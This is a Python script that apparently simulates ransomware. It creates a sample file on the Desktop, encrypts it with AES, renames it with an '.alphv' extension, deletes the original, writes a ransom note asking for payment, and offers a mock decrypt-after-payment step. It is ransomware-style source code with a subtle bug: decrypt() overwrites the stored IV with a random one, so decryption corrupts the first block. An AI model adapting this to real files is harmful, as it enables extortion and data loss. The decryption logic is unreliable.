import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from getpass import getpass

# Function to generate key and IV
def generate_key_iv(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    iv = os.urandom(16)
    return key, iv

# Function to encrypt data
def encrypt(data, password):
    salt = os.urandom(16)
    key, iv = generate_key_iv(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return salt + iv + ciphertext

# Function to decrypt data
def decrypt(encrypted_data, password):
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]
    key, iv = generate_key_iv(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

# Function to create a ransom note
def create_ransom_note(directory):
    note = """Your files have been encrypted. To decrypt them, you need to pay a ransom.
Contact us at email@example.com for instructions on how to pay and get the decryption key."""
    note_path = os.path.join(directory, "README.txt")
    with open(note_path, "w") as f:
        f.write(note)
    print(f"Ransom note created as '{note_path}'.")

# Path to desktop
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create a sample file with important information on the desktop
important_info = """This is important information.
Do not lose this file.
It contains sensitive data."""
sample_file_path = os.path.join(desktop_path, "sample_file.txt")
with open(sample_file_path, "w") as f:
    f.write(important_info)
print(f"Sample file '{sample_file_path}' created on the desktop.")

# Encrypt the sample file
password = getpass("Enter a password for encryption: ")
with open(sample_file_path, "rb") as f:
    data = f.read()
encrypted_data = encrypt(data, password)
encrypted_file_path = sample_file_path + ".alphv"
with open(encrypted_file_path, "wb") as f:
    f.write(encrypted_data)
os.remove(sample_file_path)  # Remove the original file
print(f"File '{sample_file_path}' encrypted and saved as '{encrypted_file_path}' on the desktop.")

# Create the ransom note on the desktop
create_ransom_note(desktop_path)

# Simulate ransom payment
ransom_paid = input("Have you paid the ransom? (yes/no): ").strip().lower()
if ransom_paid == 'yes':
    input_password = getpass("Enter the password to decrypt the file: ")
    with open(encrypted_file_path, "rb") as f:
        encrypted_data = f.read()

    try:
        decrypted_data = decrypt(encrypted_data, input_password)
        decrypted_file_path = sample_file_path.replace(".txt", ".decrypted.txt")
        with open(decrypted_file_path, "wb") as f:
            f.write(decrypted_data)
        os.remove(encrypted_file_path)  # Remove the encrypted file
        print(f"File '{encrypted_file_path}' decrypted and saved as '{decrypted_file_path}' on the desktop.")
    except Exception as e:
        print("Failed to decrypt the file. Incorrect password or corrupted file.")
else:
    print("Ransom not paid. File remains encrypted.")
